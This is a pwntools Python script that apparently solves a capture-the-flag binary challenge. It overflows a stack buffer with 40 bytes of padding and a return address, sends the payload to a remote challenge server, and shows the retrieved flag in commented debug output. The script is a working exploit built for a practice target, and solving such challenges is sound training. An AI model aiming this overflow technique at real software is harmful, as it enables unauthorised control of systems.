from pwn import *
import time
binf = ELF("bin")
libc = ELF.libc

'''
main 0x14b5
lectura del 1 fopen = 0x5555555554e3 = 0xfbad2488
0x555555555521 <main+108>    mov    eax, dword ptr [rbp - 0x14] antes de srand
0X133C IN-WHILE
'''

gs = '''
break *0x4011f6
'''
def start():
    if args.GDB:
        return gdb.debug(binf.path, gdbscript=gs)
    else:
        # return process(binf.path)
        return remote("mc.ax",31077)

context.log_level = "DEBUG"
context.aslr = False

print(binf.plt)

shell=""
shell=b"flag.txt"



# i=1
# while(True):
p=start()
print(p.recvuntil('think?\n'))
exp=b'A'*40+p64(0x04011f6)
p.sendline(exp)
p.interactive()

# [DEBUG] Sent 0x31 bytes:
#     00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
#     *
#     00000020  41 41 41 41  41 41 41 41  f6 11 40 00  00 00 00 00  │AAAA│AAAA│··@·│····│
#     00000030  0a                                                  │·│
#     00000031
# [*] Switching to interactive mode
# [DEBUG] Received 0x3e bytes:
#     b'flag{rob-loved-the-challenge-but-im-still-paid-minimum-wage}\n'
#     b'\n'
# flag{rob-loved-the-challenge-but-im-still-paid-minimum-wage}

# [*] Got EOF while reading in interactive


